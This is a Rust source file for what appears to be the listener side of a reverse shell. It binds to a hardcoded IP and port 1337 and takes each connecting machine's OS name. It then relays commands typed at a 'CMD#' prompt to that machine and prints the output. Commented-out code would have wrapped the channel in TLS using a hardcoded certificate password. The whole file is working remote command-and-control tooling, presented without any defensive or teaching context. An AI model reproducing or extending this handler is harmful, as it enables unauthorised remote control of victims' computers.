use native_tls::{Identity, TlsAcceptor};
use std::fs::File;
use std::io::{ErrorKind, Read, Write};
use std::net::{Ipv4Addr, SocketAddrV4, TcpListener};
use std::process::exit;
use std::sync::Arc;

#[macro_export]
macro_rules! listener {
    ($ip:expr, $port:expr) => {{
        let ip = $ip.parse::<Ipv4Addr>().expect("Invalid IP address");
        let port = $port.parse::<u16>().expect("Invalid port");
        let addr = SocketAddrV4::new(ip, port);
        let listener = TcpListener::bind(addr).expect("Failed to bind to address");
        listener
    }};
}

fn main() {
    let ip = "198.19.249.3";
    let port = "1337";
    let passwd = "oui";

    /*let cert = File::open("./certificate.pfx");
    if cert.is_err() {
        println!("Error certificate: {}", cert.err().unwrap());
        return;
    }
    let mut cert = cert.unwrap();

    let mut id = vec![];
    let _ = match cert.read_to_end(&mut id) {
        Ok(size) => size,
        Err(e) => {
            println!("Error read cert: {}", e);
            exit(1);
        }
    };

    let id = match Identity::from_pkcs12(&id, passwd) {
        Ok(id) => id,
        Err(e) => {
            println!("Error creating id: {}", e);
            exit(1);
        }
        };*/

    let listener = listener!(ip, port);
    /*let acceptor = match TlsAcceptor::new(id) {
    Ok(acceptor) => Arc::new(acceptor),
    Err(e) => {
        println!("Error creating acceptor: {}", e);
        exit(1);
    }
    };*/

    println!("Server binded to {}:{}", ip, port);
    for stream in listener.incoming() {
        let mut stream = match stream {
            Ok(stream) => stream,
            Err(e) => {
                println!("Error streaming tcp: {}", e);
                continue;
            }
        };

        //let acceptor_thread = acceptor.clone();
        std::thread::spawn(move || {
            let addr = match stream.peer_addr() {
                Ok(add) => add.to_string(),
                Err(e) => e.kind().to_string(),
            };
            println!("New connection: {}", addr);
            //let mut stream = acceptor_thread.accept(stream).expect("Error accepting TSL");
            let mut buffer = [0; 4096];
            let mut os = String::new();

            match stream.read(&mut buffer) {
                Ok(size) => {
                    os = String::from_utf8_lossy(&buffer[..size])
                        .trim_end_matches('\0')
                        .to_string()
                }
                Err(e) => {
                    println!("Error reading in thread: {}", e);
                }
            }

            loop {
                let prompt = format!("{}-{}-CMD# ", os, addr);
                print!("{}", prompt);
                std::io::stdout().flush().expect("Failed to flush");
                let mut cmd = String::new();
                std::io::stdin().read_line(&mut cmd).unwrap();

                match stream
                    .write_all(cmd.as_bytes())
                    .map_err(|err| (err.kind(), err))
                {
                    Ok(_) => (),
                    Err((ErrorKind::BrokenPipe, _)) => {
                        println!("Connection closed");
                        return;
                    }
                    Err((_, e)) => {
                        println!("Error writing to stream: {}", e);
                        continue;
                    }
                }

                let mut buffer = [0; 4096];
                let size = stream.read(&mut buffer).expect("Error reading from stream");
                println!(
                    "{}",
                    String::from_utf8_lossy(&buffer[..size])
                        .trim_end_matches('\0')
                        .trim_end()
                );
            }
        });
    }
}
